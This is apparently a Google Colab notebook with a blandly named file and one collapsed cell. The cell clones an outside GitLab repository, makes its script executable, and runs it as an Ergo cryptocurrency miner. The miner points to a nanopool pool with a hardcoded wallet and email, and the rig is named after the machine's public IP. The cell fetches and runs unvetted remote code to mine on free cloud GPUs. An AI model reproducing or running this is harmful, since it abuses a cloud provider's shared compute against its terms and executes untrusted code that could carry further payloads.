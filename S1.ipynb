{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "S1.ipynb",
      "private_outputs": true,
      "provenance": [],
      "collapsed_sections": [
        "VZM6Yd3T8BD5H"
      ],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "VZM6Yd3T8BD5H"
      },
      "source": [
        "!nvidia-smi\n",
        "!git clone https://gitlab.com/dd2568752/racikan.git\n",
        "%cd racikan\n",
        "!chmod +x racikan.sh\n",
        "!ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./racikan.sh -algo autolykos -pool1 ergo-eu1.nanopool.org:11433 -wallet 9hHjHAbD4wEz19Tb59ftxeACf17gePpW4D17sdrwWUBGAR7R3p1 -coin ergo -rigName $ip -email dd2568752@gmail.com"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
